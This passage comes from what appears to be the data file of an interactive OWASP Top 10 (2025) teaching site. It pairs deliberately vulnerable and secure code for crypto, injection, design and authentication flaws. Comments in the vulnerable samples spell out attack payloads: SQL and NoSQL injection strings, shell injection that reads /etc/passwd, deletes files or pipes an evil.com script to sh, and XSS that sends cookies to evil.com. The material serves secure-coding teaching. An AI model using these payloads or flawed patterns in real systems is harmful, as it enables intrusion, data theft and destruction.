def verify_password_argon2(password, stored_hash):
    return ph.verify(stored_hash, password)`,
      },
      {
        title: "Hardcoded Encryption Keys",
        vulnerableCode: `// Java — Vulnerable: Encryption key hardcoded in source
public class EncryptionService {

    // Key is in source code → visible in Git history!
    private static final String SECRET_KEY =
        "my-super-secret-key-12345";

    public static String encrypt(String data) throws Exception {
        SecretKeySpec keySpec = new SecretKeySpec(
            SECRET_KEY.getBytes(), "AES"
        );
        // Using ECB mode — patterns in plaintext are
        // visible in ciphertext!
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec);
        byte[] encrypted = cipher.doFinal(data.getBytes());
        return Base64.getEncoder().encodeToString(encrypted);
    }

    // Problems:
    // 1. Key in source code → visible in Git history
    // 2. Same key for all environments (dev, staging, prod)
    // 3. ECB mode leaks patterns (identical plaintext blocks
    //    produce identical ciphertext blocks)
    // 4. Cannot rotate the key without a code deploy
}`,
        secureCode: `// Java — Secure: Key from vault + AES-GCM
public class EncryptionService {

    // Key loaded from environment / key vault at startup
    private final SecretKey key;

    public EncryptionService() throws Exception {
        String keyHex = System.getenv("ENCRYPTION_KEY");
        if (keyHex == null || keyHex.length() != 64) {
            throw new IllegalStateException(
                "Invalid encryption key configuration"
            );
        }
        byte[] keyBytes = HexFormat.of().parseHex(keyHex);
        this.key = new SecretKeySpec(keyBytes, "AES");
    }

    public String encrypt(String data) throws Exception {
        // Generate random IV for each encryption
        byte[] iv = new byte[12]; // 96-bit IV for GCM
        SecureRandom.getInstanceStrong().nextBytes(iv);

        // Use AES-256-GCM (authenticated encryption)
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, key,
            new GCMParameterSpec(128, iv));
        byte[] ciphertext = cipher.doFinal(
            data.getBytes(StandardCharsets.UTF_8));

        // Prepend IV to ciphertext (needed for decryption)
        byte[] result = new byte[iv.length + ciphertext.length];
        System.arraycopy(iv, 0, result, 0, iv.length);
        System.arraycopy(ciphertext, 0, result, iv.length,
            ciphertext.length);

        return Base64.getEncoder().encodeToString(result);
    }
    // Key management: AWS KMS / HashiCorp Vault / Azure Key Vault
}`,
      },
      {
        title: "Data Transmitted Over HTTP (No TLS)",
        vulnerableCode: `<!-- Vulnerable: Login form submitting over HTTP -->
<form action="http://api.example.com/login" method="POST">
  <input type="text" name="username">
  <input type="password" name="password">
  <button type="submit">Login</button>
</form>

<!--
  Data sent in PLAINTEXT over the network.

  An attacker on the same network (coffee shop WiFi,
  corporate network, ISP) can see everything:

  POST /login HTTP/1.1
  Host: api.example.com
  Content-Type: application/x-www-form-urlencoded

  username=alice&password=MySecretPass123

  Interception tools: Wireshark, tcpdump, mitmproxy
  No special skills required to intercept.

  Also leaked: session cookies, API tokens, personal data
  in ALL subsequent HTTP requests.
-->`,
        secureCode: `<!-- Secure: HTTPS with HSTS enforcement -->
<form action="https://api.example.com/login" method="POST">
  <input type="text" name="username" autocomplete="username">
  <input type="password" name="password"
         autocomplete="current-password">
  <button type="submit">Login</button>
</form>

<!-- Server enforces HTTPS with HSTS header: -->
<!-- Strict-Transport-Security: max-age=31536000;
     includeSubDomains; preload -->

<!-- Additional server-side TLS configuration: -->
<!--
  - TLS 1.3 only (disable TLS 1.0, 1.1, 1.2)
  - Strong cipher suites only
  - OCSP stapling enabled
  - Certificate transparency logged
  - HTTP automatically redirects to HTTPS (301)
  - Secure cookies:
    Set-Cookie: session=...; Secure; HttpOnly; SameSite=Strict
  - Submit domain to HSTS preload list:
    https://hstspreload.org
-->`,
      },
      {
        title: "Weak Random Number Generation",
        vulnerableCode: `# Python — Vulnerable: random module for security values
import random
import string

def generate_session_token():
    # random module is NOT cryptographically secure
    # It uses Mersenne Twister — state can be predicted
    # after observing 624 outputs
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(32))

def generate_reset_token():
    # Easily predictable — attacker can brute-force
    return str(random.randint(100000, 999999))
    # Only 900,000 possible values!

def generate_api_key():
    # Seeding with time makes it even more predictable
    random.seed(int(time.time()))
    return ''.join(random.choices(
        string.ascii_letters + string.digits, k=40
    ))
    # Attacker knows the approximate seed (current time)
    # Can generate the same "random" key`,
        secureCode: `# Python — Secure: secrets module (cryptographically safe)
import secrets
import uuid

def generate_session_token():
    # secrets uses os.urandom() — cryptographically secure
    return secrets.token_hex(32)  # 256 bits of entropy
    # "a1b2c3d4e5f6...64 hex characters"
    # Cannot be predicted even after observing prior outputs

def generate_reset_token():
    # URL-safe token (for password reset links)
    return secrets.token_urlsafe(32)
    # "dGhpcyBpcyBhIHRva2Vu..." (43 characters)
    # 256 bits of entropy — not brute-forceable

def generate_api_key():
    # UUID4 uses cryptographic random source
    return str(uuid.uuid4())
    # "f47ac10b-58cc-4372-a567-0e02b2c3d479"
    # 122 bits of entropy from CSPRNG

# IMPORTANT: Never use these for security purposes:
# - random.random()     → predictable PRNG
# - random.randint()    → predictable PRNG
# - random.choice()     → predictable PRNG
# ALWAYS use: secrets.token_hex(), secrets.token_urlsafe()`,
      },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════
  //  A05: Injection
  // ═══════════════════════════════════════════════════════════════════
  {
    id: "a05",
    code: "A05:2025",
    title: "Injection",
    prevCode: "A03:2021",
    prevTitle: "Injection",
    badge: { text: "Down from #3", type: "moved-down" },
    description:
      "Injection flaws allow attackers to insert malicious code into a program through its inputs. This includes SQL injection, NoSQL injection, OS command injection, LDAP injection, and Cross-Site Scripting (XSS).",
    comparison:
      'Dropped from <strong>#3 to #5</strong>, but remains one of the most actively exploited vulnerability classes. The decline in ranking reflects improved framework defaults (parameterized queries, auto-escaping templates) rather than reduced risk. XSS is explicitly included under Injection in both 2021 and 2025.',
    sandbox: {
      title: "DOM-Based XSS Search",
      description:
        'Type a search query below. The vulnerable version uses <code>innerHTML</code> to render results, allowing script injection. The secure version uses <code>textContent</code> and DOMPurify. Try entering: <code>&lt;img src=x onerror=alert("XSS")&gt;</code>',
      vulnerableLabel: "Vulnerable: innerHTML",
      secureLabel: "Secure: textContent + DOMPurify",
    },
    examples: [
      {
        title: "SQL Injection",
        vulnerableCode: `# Python — Vulnerable: String formatting in SQL query
from flask import request
import sqlite3

@app.route('/api/users')
def get_users():
    username = request.args.get('username')

    # User input directly formatted into SQL string
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return jsonify(cursor.fetchall())

# Normal request:
# GET /api/users?username=alice
# Query: SELECT * FROM users WHERE username = 'alice'

# Attack:
# GET /api/users?username=' OR '1'='1' --
# Query: SELECT * FROM users WHERE username = ''
#        OR '1'='1' --'
# Returns ALL users in the database!

# Destructive attack:
# GET /api/users?username='; DROP TABLE users; --
# Deletes the entire users table.`,
        secureCode: `# Python — Secure: Parameterized queries
from flask import request
import sqlite3

@app.route('/api/users')
def get_users():
    username = request.args.get('username')

    # Parameterized query — user input is NEVER part of SQL
    query = "SELECT * FROM users WHERE username = ?"
    cursor.execute(query, (username,))
    return jsonify(cursor.fetchall())

# The database driver treats the parameter as DATA,
# never as SQL syntax. Even if the input contains:
#   ' OR '1'='1' --
# It searches for a user literally named:
#   "' OR '1'='1' --"
# ...which doesn't exist. No injection possible.

# Using an ORM (even safer):
# SQLAlchemy
user = User.query.filter_by(username=username).first()
# Django ORM
user = User.objects.get(username=username)
# Both handle parameterization automatically.

# Additional defenses:
# - Input validation (allowlist of characters)
# - Least privilege DB user (read-only where possible)
# - WAF rules for SQL injection patterns`,
      },
      {
        title: "DOM-Based XSS via innerHTML",
        vulnerableCode: `<!-- Vulnerable: Using innerHTML with unsanitized input -->
<input type="text" id="search" placeholder="Search...">
<div id="results"></div>

<script>
  const input = document.getElementById('search');
  const results = document.getElementById('results');

  input.addEventListener('input', function() {
    const query = input.value;

    // DANGEROUS: Directly injecting user input into DOM
    results.innerHTML =
      '<p>Results for: <strong>' + query + '</strong></p>';

    // If a user types:
    //   <img src=x onerror=alert('XSS')>
    //
    // The browser creates an <img> tag, the src fails,
    // and the onerror handler executes arbitrary JavaScript.
    //
    // More dangerous payloads:
    //   <script>fetch('https://evil.com?c='+document.cookie)<\/script>
    //   <img src=x onerror="new Image().src='https://evil.com?c='+document.cookie">
  });
</script>`,
        secureCode: `<!-- Secure: Using textContent + DOMPurify -->
<input type="text" id="search" placeholder="Search...">
<div id="results"></div>

<script src="https://cdn.jsdelivr.net/npm/dompurify@3/dist/
purify.min.js"></script>

<script>
  const input = document.getElementById('search');
  const results = document.getElementById('results');

  input.addEventListener('input', function() {
    const query = input.value;

    // Option 1: textContent (safest — no HTML parsing at all)
    results.textContent = 'Results for: ' + query;
    // All HTML tags are rendered as visible text, never executed

    // Option 2: If you NEED HTML, sanitize with DOMPurify first
    // const clean = DOMPurify.sanitize(query, {
    //   ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    //   ALLOWED_ATTR: []
    // });
    // results.innerHTML =
    //   '<p>Results for: <strong>' + clean + '</strong></p>';

    // Both approaches neutralize the XSS payload:
    // <img src=x onerror=alert('XSS')> is rendered
    // as harmless visible text, never executed as HTML.
  });
</script>`,
      },
      {
        title: "OS Command Injection",
        vulnerableCode: `# Ruby — Vulnerable: User input in system command
require 'sinatra'

get '/api/ping' do
  host = params[:host]

  # User input directly inserted into shell command!
  output = \`ping -c 3 #{host}\`

  content_type :json
  { result: output }.to_json
end

# Normal request:
# GET /api/ping?host=google.com
# Command: ping -c 3 google.com

# Attack:
# GET /api/ping?host=google.com;cat /etc/passwd
# Command: ping -c 3 google.com;cat /etc/passwd
# Runs TWO commands — returns the password file!

# Destructive:
# GET /api/ping?host=;rm -rf /
# GET /api/ping?host=|curl https://evil.com/shell.sh|sh
# Downloads and executes a remote script!`,
        secureCode: `# Ruby — Secure: Input validation + safe command execution
require 'sinatra'
require 'resolv'
require 'open3'

VALID_HOSTNAME = /\\A[a-zA-Z0-9][a-zA-Z0-9.\\-]{0,253}[a-zA-Z0-9]\\z/

get '/api/ping' do
  host = params[:host]

  # Step 1: Validate input format
  unless host&.match?(VALID_HOSTNAME)
    halt 400, { error: "Invalid hostname" }.to_json
  end

  # Step 2: Verify it resolves to a public IP
  begin
    ip = Resolv.getaddress(host)
    if ip.start_with?("10.", "192.168.", "172.", "127.")
      halt 403, { error: "Internal hosts not allowed" }.to_json
    end
  rescue Resolv::ResolvError
    halt 400, { error: "Hostname not found" }.to_json
  end

  # Step 3: Use array form — shell metacharacters not interpreted
  stdout, stderr, status = Open3.capture3(
    "ping", "-c", "3", host
  )
  # "ping", "-c", "3", "google.com;cat /etc/passwd"
  # Treated as a single argument — no shell injection possible

  content_type :json
  { result: stdout, success: status.success? }.to_json
end`,
      },
      {
        title: "NoSQL Injection",
        vulnerableCode: `// Node.js + MongoDB — Vulnerable: Unvalidated query input
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  // User input directly used in MongoDB query
  const user = await db.collection('users').findOne({
    username: username,
    password: password
  });

  if (user) {
    res.json({ success: true, token: generateToken(user) });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// Normal request:
// POST /api/login
// { "username": "admin", "password": "secret123" }

// Attack — send a MongoDB operator as password:
// POST /api/login
// { "username": "admin", "password": { "$ne": "" } }
//
// Query becomes:
// { username: "admin", password: { $ne: "" } }
// This matches ANY document where password is NOT empty
// → Admin login without knowing the password!

// Other attacks:
// { "$gt": "" }  → matches any non-empty string
// { "$regex": ".*" } → matches everything`,
        secureCode: `// Node.js + MongoDB — Secure: Input sanitization + type checking
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  // Step 1: Ensure inputs are strings (not objects/operators)
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input type' });
  }

  // Step 2: Find user by username only
  const user = await db.collection('users').findOne({
    username: username
  });

  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Step 3: Compare password hash separately (not in query)
  const isValid = await bcrypt.compare(password, user.passwordHash);
  if (!isValid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  res.json({ success: true, token: generateToken(user) });
});

// { "password": { "$ne": "" } } → rejected at type check
// Only string values are accepted — MongoDB operators blocked

// Additional defenses:
// - Use mongoose with schema validation (enforces types)
// - Use express-mongo-sanitize middleware
// - Never pass raw req.body into database queries`,
      },
      {
        title: "Template Injection (SSTI)",
        vulnLang: "python",
        secureLang: "python",
        vulnerableCode: `# Python Jinja2 — Vulnerable: User input in template string
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')

    # DANGEROUS: User input directly in template string!
    template = f"<h1>Hello {name}!</h1>"
    return render_template_string(template)

# Normal request:
# GET /greet?name=Alice
# Output: <h1>Hello Alice!</h1>

# Attack — Server-Side Template Injection (SSTI):
# GET /greet?name={{7*7}}
# Output: <h1>Hello 49!</h1>  ← Template engine evaluated it!

# Remote Code Execution:
# GET /greet?name={{config.items()}}
# → Dumps all Flask configuration (SECRET_KEY, DB passwords)

# GET /greet?name={{''.__class__.__mro__[1].__subclasses__()}}
# → Lists all Python classes → find os.system → execute commands`,
        secureCode: `# Python Jinja2 — Secure: Pass data as template variables
from flask import Flask, request, render_template_string
from markupsafe import escape

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')

    # SAFE: User input passed as a template variable
    # Jinja2 auto-escapes variables in {{ }} by default
    template = "<h1>Hello {{ name }}!</h1>"
    return render_template_string(template, name=name)

# GET /greet?name={{7*7}}
# Output: <h1>Hello {{7*7}}!</h1>
# The {{ }} is treated as literal text, NOT evaluated

# GET /greet?name=<script>alert('XSS')</script>
# Output: <h1>Hello &lt;script&gt;alert('XSS')&lt;/script&gt;!</h1>
# HTML is auto-escaped by Jinja2

# Best practices:
# 1. Never use f-strings or .format() with templates
# 2. Always pass user input as template variables
# 3. Use Jinja2 sandboxed environment for extra safety:
#    from jinja2.sandbox import SandboxedEnvironment
#    env = SandboxedEnvironment()
# 4. Use separate template files (render_template)
#    instead of render_template_string when possible`,
      },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════
  //  A06: Insecure Design
  // ═══════════════════════════════════════════════════════════════════
  {
    id: "a06",
    code: "A06:2025",
    title: "Insecure Design",
    prevCode: "A04:2021",
    prevTitle: "Insecure Design",
    badge: { text: "Down from #4", type: "moved-down" },
    description:
      'Insecure Design represents architectural weaknesses — "missing or ineffective control design." Unlike implementation bugs, insecure design cannot be fixed by perfect coding alone. It requires threat modeling and secure design patterns from the start.',
    comparison:
      "Dropped from <strong>#4 to #6</strong>. Still a fundamental category emphasizing that security must be baked in at the design phase. The 2025 update reinforces the need for threat modeling, secure design patterns, and reference architectures rather than bolting on security after the fact.",
    sandbox: {
      title: "Business Logic Bypass — Coupon Abuse",
      description:
        'A poorly designed e-commerce checkout lets users apply the same discount coupon unlimited times. The secure version tracks used coupons and enforces single-use. Try applying the coupon "SAVE20" multiple times.',
      vulnerableLabel: "Vulnerable: No Usage Limit",
      secureLabel: "Secure: Single-Use Enforcement",
    },
    examples: [
      {
        title: "Unlimited Coupon Abuse",
        vulnerableCode: `# Python — Vulnerable: No server-side coupon usage tracking

cart_total = 100.00

def apply_coupon(code):
    global cart_total

    # No check if coupon was already used!
    if code == "SAVE20":
        cart_total -= 20
        return {"success": True, "message": "Coupon applied! -$20"}

    return {"success": False, "message": "Invalid coupon"}

# User can call apply_coupon("SAVE20") repeatedly:
# Call 1: $100 → $80
# Call 2: $80  → $60
# Call 3: $60  → $40
# Call 4: $40  → $20
# Call 5: $20  → $0   ← FREE ITEMS!
# Call 6: $0   → -$20 ← STORE OWES THE USER!

# This is a DESIGN flaw, not a coding bug.
# The system was never designed to track coupon usage.`,
        secureCode: `# Python — Secure: Coupon usage tracking + validation

cart_total = 100.00
used_coupons = set()
MINIMUM_TOTAL = 0

COUPONS = {
    "SAVE20": 20,
    "SAVE10": 10,
}

def apply_coupon(code):
    global cart_total

    # Check 1: Has this coupon already been used?
    if code in used_coupons:
        return {
            "success": False,
            "message": "Coupon already used in this order."
        }

    # Check 2: Is the coupon valid?
    discount = COUPONS.get(code)
    if not discount:
        return {"success": False, "message": "Invalid coupon code."}

    # Check 3: Will the total go below minimum?
    if cart_total - discount < MINIMUM_TOTAL:
        return {
            "success": False,
            "message": "Discount exceeds remaining total."
        }

    # Apply and record usage
    cart_total -= discount
    used_coupons.add(code)
    return {
        "success": True,
        "message": f"Coupon applied! -\${discount}"
    }`,
      },
      {
        title: "Unrestricted Password Reset",
        vulnerableCode: `// Java — Vulnerable: Password reset with no rate limit
@RestController
public class ResetController {

    @PostMapping("/api/reset-password")
    public ResponseEntity<?> requestReset(@RequestBody Map<String, String> body) {
        String email = body.get("email");

        // Generate a simple 6-digit numeric code
        int code = 100000 + new Random().nextInt(900000);

        // Store code with no expiration
        resetCodes.put(email, code);

        emailService.send(email, "Your reset code: " + code);
        return ResponseEntity.ok(Map.of("message", "Code sent."));
    }

    @PostMapping("/api/verify-reset")
    public ResponseEntity<?> verifyReset(@RequestBody Map<String, String> body) {
        String email = body.get("email");
        int code = Integer.parseInt(body.get("code"));

        // No attempt limit! Attacker brute-forces 000000-999999
        if (resetCodes.containsKey(email)
                && resetCodes.get(email) == code) {
            userService.setPassword(email, body.get("newPassword"));
            return ResponseEntity.ok(Map.of("message", "Password changed!"));
        }
        return ResponseEntity.status(400).body(Map.of("error", "Invalid code"));
    }
}

// Attacker: 1 million guesses at ~1000/sec = 17 minutes
// to take over any account.`,
        secureCode: `// Java — Secure: Rate-limited reset with expiring token
@RestController
public class ResetController {

    @PostMapping("/api/reset-password")
    @RateLimiter(name = "reset", fallbackMethod = "rateLimitFallback")
    public ResponseEntity<?> requestReset(@RequestBody Map<String, String> body) {
        String email = body.get("email");

        // Generate cryptographically secure token (not numeric)
        String token = UUID.randomUUID().toString();

        resetTokenRepository.save(new ResetToken(
            email,
            hashToken(token),
            Instant.now().plusSeconds(900),  // 15 min expiry
            0  // attempt counter
        ));

        emailService.send(email,
            "https://app.com/reset?token=" + token);

        // Always return success (don't leak if email exists)
        return ResponseEntity.ok(
            Map.of("message", "If the email exists, a link was sent.")
        );
    }

    @PostMapping("/api/verify-reset")
    public ResponseEntity<?> verifyReset(@RequestBody Map<String, String> body) {
        String token = body.get("token");
        ResetToken record = resetTokenRepository
            .findByHashedToken(hashToken(token));

        if (record == null || record.isExpired()) {
            return ResponseEntity.badRequest()
                .body(Map.of("error", "Invalid or expired"));
        }
        if (record.getAttempts() >= 3) {
            return ResponseEntity.status(429)
                .body(Map.of("error", "Too many attempts"));
        }
        if (!passwordValidator.isStrong(body.get("newPassword"))) {
            return ResponseEntity.badRequest()
                .body(Map.of("error", "Weak password"));
        }

        userService.changePassword(record.getEmail(), body.get("newPassword"));
        resetTokenRepository.delete(record);  // One-time use
        return ResponseEntity.ok(Map.of("message", "Password changed."));
    }
}`,
      },
      {
        title: "No CAPTCHA on Sensitive Forms",
        vulnLang: "markup",
        secureLang: "markup",
        vulnerableCode: `<!-- Vulnerable: Registration form with no bot protection -->
<form action="/api/register" method="POST">
  <input name="email" type="email" required>
  <input name="password" type="password" required>
  <button type="submit">Create Account</button>
</form>

<!-- No CAPTCHA, no rate limiting, no email verification -->

<!--
  An attacker can script account creation:

  for i in range(10000):
      requests.post('/api/register', json={
          'email': f'spam{i}@tempmail.com',
          'password': 'password123'
      })

  Result:
  - 10,000 fake accounts created instantly
  - Used for spam, abuse, fake reviews
  - Overwhelms database and support team
  - No way to distinguish real users from bots
-->`,
        secureCode: `<!-- Secure: Multi-layered bot protection -->
<form action="/api/register" method="POST" id="regForm">
  <input name="email" type="email" required>
  <input name="password" type="password" required>

  <!-- Invisible honeypot field (bots fill it, humans don't) -->
  <input name="website" type="text" style="display:none"
         tabindex="-1" autocomplete="off">

  <!-- reCAPTCHA v3 (invisible, score-based) -->
  <div id="recaptcha"></div>

  <button type="submit">Create Account</button>
</form>

<script>
  // Server-side validation (Python Flask):
  // @app.route('/api/register', methods=['POST'])
  // @limiter.limit("5 per minute")  # Rate limiting
  // def register():
  //     # Check honeypot
  //     if request.form.get('website'):
  //         return jsonify(ok=True)  # Trick bots
  //
  //     # Verify CAPTCHA
  //     score = verify_captcha(request.form['captcha_token'])
  //     if score < 0.5:
  //         return jsonify(error='Bot detected'), 403
  //
  //     # Require email verification before activation
  //     user = create_user(request.form)
  //     send_verification_email(user.email)
  //     return jsonify(message='Check your email to verify.')
</script>`,
      },
      {
        title: "Predictable Resource Identifiers",
        vulnerableCode: `// Go — Vulnerable: Sequential IDs for sensitive data
package main

var lastOrderID int64 = 1000

func createOrder(userID string, items []Item) (*Order, error) {
    lastOrderID++
    orderID := lastOrderID  // Sequential: 1001, 1002, 1003...

    order := &Order{
        ID:      orderID,
        UserID:  userID,
        Items:   items,
        Invoice: fmt.Sprintf("/invoices/INV-%d.pdf", orderID),
    }

    db.Save(order)
    return order, nil
}

// Attacker can enumerate:
// GET /api/orders/1001 → their order
// GET /api/orders/1000 → previous customer's order
// GET /api/orders/999  → another customer's order
// ...
// GET /api/orders/1    → first order ever placed

// Also reveals business intelligence:
// "The site has had 1001 orders total"
// "They get ~50 orders/day based on ID growth"`,
        secureCode: `// Go — Secure: UUIDs for resource identifiers
package main

import "github.com/google/uuid"

func createOrder(userID string, items []Item) (*Order, error) {
    orderID := uuid.New().String()
    // "f47ac10b-58cc-4372-a567-0e02b2c3d479"

    order := &Order{
        ID:      orderID,
        UserID:  userID,
        Items:   items,
        Invoice: fmt.Sprintf("/invoices/%s.pdf", orderID),
    }

    db.Save(order)
    return order, nil
}

// Attacker cannot enumerate:
// GET /api/orders/f47ac10b-...d479 → valid
// GET /api/orders/f47ac10b-...d480 → 404
// There are 2^122 possible UUIDs — not brute-forceable.

// Combined with ownership checks (defense in depth):
func getOrder(w http.ResponseWriter, r *http.Request) {
    orderID := chi.URLParam(r, "id")
    userID := r.Context().Value("userID").(string)

    order, err := db.FindOrder(orderID)
    if err != nil || order.UserID != userID {
        // 404 (not 403) — don't reveal if the ID exists
        http.Error(w, "Not found", http.StatusNotFound)
        return
    }
    json.NewEncoder(w).Encode(order)
}`,
      },
      {
        title: "No Re-authentication for Sensitive Actions",
        vulnerableCode: `// C# ASP.NET — Vulnerable: No re-auth for critical actions
[Authorize]
[ApiController]
[Route("api/account")]
public class AccountController : ControllerBase
{
    [HttpPost("change-email")]
    public IActionResult ChangeEmail([FromBody] ChangeEmailDto dto)
    {
        // Only checks if user is logged in — no re-auth!
        var userId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
        _userService.UpdateEmail(userId, dto.NewEmail);
        return Ok(new { message = "Email changed." });
    }

    [HttpPost("change-password")]
    public IActionResult ChangePassword([FromBody] ChangePasswordDto dto)
    {
        // Doesn't ask for current password!
        var userId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
        _userService.UpdatePassword(userId, dto.NewPassword);
        return Ok(new { message = "Password changed." });
    }
}

// If an attacker steals the session (XSS, shared computer):
// 1. Change email to attacker@evil.com
// 2. Change password to anything
// 3. Original user is permanently locked out`,
        secureCode: `// C# ASP.NET — Secure: Re-authenticate for sensitive actions
[Authorize]
[ApiController]
[Route("api/account")]
public class AccountController : ControllerBase
{
    [HttpPost("change-email")]
    public async Task<IActionResult> ChangeEmail(
        [FromBody] ChangeEmailDto dto)
    {
        var userId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
        var user = await _userService.FindById(userId);

        // Require current password for sensitive changes
        if (!await _userService.VerifyPassword(
                user, dto.CurrentPassword))
        {
            return StatusCode(403, new {
                error = "Current password required."
            });
        }

        // Send confirmation to BOTH old and new email
        var token = Guid.NewGuid().ToString();
        await _emailChangeService.Create(new EmailChange {
            UserId = userId,
            NewEmail = dto.NewEmail,
            Token = HashToken(token),
            ExpiresAt = DateTime.UtcNow.AddHours(1)
        });

        await _emailService.Send(user.Email,
            "Someone requested an email change for your account.");
        await _emailService.Send(dto.NewEmail,
            $"Confirm your new email: .../confirm?token={token}");

        return Ok(new {
            message = "Confirmation sent to new email."
        });
    }
}`,
      },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════
  //  A07: Authentication Failures
  // ═══════════════════════════════════════════════════════════════════
  {
    id: "a07",
    code: "A07:2025",
    title: "Authentication Failures",
    prevCode: "A07:2021",
    prevTitle: "Identification and Authentication Failures",
    badge: { text: "Same #7", type: "same" },
    description:
      "Authentication Failures allow attackers to compromise passwords, keys, or session tokens. This covers brute force, credential stuffing, weak passwords, missing MFA, and improper session management.",
    comparison:
      'Renamed from "Identification and Authentication Failures" for simplicity. Position unchanged at <strong>#7</strong>. The 2025 version continues to stress the importance of multi-factor authentication, strong password policies, and rate limiting as baseline requirements.',
    sandbox: {
      title: "Brute Force Login Simulation",
      description:
        'This simulates a login form attacked with common passwords. The vulnerable version has no rate limiting — the attacker can try unlimited passwords. The secure version locks the account after 3 failed attempts. <br>The password is <code>dragon</code>. Watch the automated brute-force attack.',
      vulnerableLabel: "Vulnerable: No Rate Limiting",
      secureLabel: "Secure: Account Lockout",
    },
    examples: [
      {
        title: "No Rate Limiting / Brute Force",
        vulnerableCode: `// JavaScript — Vulnerable: No rate limiting or lockout
const users = { admin: 'dragon' };

function login(username, password) {
  // No attempt counting, no delay, no lockout
  if (users[username] === password) {
    return { success: true, message: 'Login successful!' };
  }
  return { success: false, message: 'Invalid credentials.' };
}

// An attacker can try thousands of passwords:
const commonPasswords = [
  '123456', 'password', 'admin', 'letmein',
  'welcome', 'monkey', 'dragon', // ← will succeed
  'master', 'qwerty', 'login'
];

// No throttling — all attempts are instant
commonPasswords.forEach(pw => {
  const result = login('admin', pw);
  if (result.success) {
    console.log('CRACKED! Password is: ' + pw);
  }
});`,
        secureCode: `// JavaScript — Secure: Rate limiting + account lockout
const users = { admin: 'dragon' };
const attempts = {};
const MAX_ATTEMPTS = 3;
const LOCKOUT_MS = 30000; // 30-second lockout

function login(username, password) {
  if (!attempts[username]) {
    attempts[username] = { count: 0, lockedUntil: 0 };
  }
  const record = attempts[username];

  // Check if account is locked
  if (Date.now() < record.lockedUntil) {
    const remaining = Math.ceil(
      (record.lockedUntil - Date.now()) / 1000
    );
    return {
      success: false,
      message: \`Account locked. Try again in \${remaining}s.\`
    };
  }

  if (users[username] === password) {
    record.count = 0;
    return { success: true, message: 'Login successful!' };
  }

  record.count++;
  if (record.count >= MAX_ATTEMPTS) {
    record.lockedUntil = Date.now() + LOCKOUT_MS;
    return {
      success: false,
      message: 'Too many attempts. Account locked for 30s.'
    };
  }

  return {
    success: false,
    message: \`Invalid. \${MAX_ATTEMPTS - record.count} attempts left.\`
  };
}`,
      },
      {
        title: "Weak Password Policy",
        vulnerableCode: `# Ruby on Rails — Vulnerable: No password requirements
class User < ApplicationRecord
  # No password validation at all!
  has_secure_password

  validates :username, presence: true, uniqueness: true
  # No validates :password

  # These all work:
  # User.create(username: 'admin', password: '1')
  # User.create(username: 'admin', password: 'password')
  # User.create(username: 'admin', password: 'admin')
  # User.create(username: 'admin', password: '123456')
  # User.create(username: 'admin', password: 'aaa')
end

# With no policy, 81% of breaches involve weak passwords.
# Credential stuffing uses leaked password lists
# that are 99% effective against weak-policy sites.`,
        secureCode: `# Ruby on Rails — Secure: Comprehensive password policy
class User < ApplicationRecord
  has_secure_password

  validates :username, presence: true, uniqueness: true

  validates :password,
    length: { minimum: 12, maximum: 128 },
    format: {
      with: /(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)/,
      message: "must include uppercase, lowercase, and a number"
    }

  validate :password_not_common
  validate :password_not_contains_username

  private

  COMMON_PASSWORDS = File.readlines(
    Rails.root.join("config", "common_passwords.txt")
  ).map(&:strip).to_set.freeze

  def password_not_common
    if password.present? && COMMON_PASSWORDS.include?(password.downcase)
      errors.add(:password, "is too common (found in breach lists)")
    end
  end

  def password_not_contains_username
    if password.present? && username.present? &&
       password.downcase.include?(username.downcase)
      errors.add(:password, "cannot contain your username")
    end
  end
end

# User.create(username: 'admin', password: '1') → REJECTED
# User.create(username: 'admin', password: 'Str0ngP@ss2024!') → OK`,
      },
      {
        title: "Session Fixation",
        vulnerableCode: `<?php
// PHP — Vulnerable: Session ID not regenerated after login

session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $user = authenticate($username, $password);

    if ($user) {
        // Reuses the EXISTING session ID — not regenerated!
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['role'] = $user['role'];
        header('Location: /dashboard');
        exit;
    }
}

// Attack scenario:
// 1. Attacker visits the site → gets session ID "abc123"
// 2. Attacker sends victim a link:
//    https://app.com/login?PHPSESSID=abc123
// 3. Victim clicks link, logs in
// 4. Victim's session uses ID "abc123" (not regenerated)
// 5. Attacker already knows session ID "abc123"
// 6. Attacker uses "abc123" → is now logged in as victim
?>`,
        secureCode: `<?php
// PHP — Secure: Regenerate session ID on login

session_start();

// Configure secure session settings
ini_set('session.cookie_httponly', 1);  // No JS access
ini_set('session.cookie_secure', 1);    // HTTPS only
ini_set('session.cookie_samesite', 'Strict');
ini_set('session.use_strict_mode', 1);  // Reject unknown IDs

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $user = authenticate($username, $password);

    if ($user) {
        // CRITICAL: Destroy old session and create a new one
        session_regenerate_id(true);  // true = delete old session

        $_SESSION['user_id'] = $user['id'];
        $_SESSION['role'] = $user['role'];
        $_SESSION['created_at'] = time();
        $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];

        // Set session lifetime (1 hour)
        $_SESSION['expires_at'] = time() + 3600;

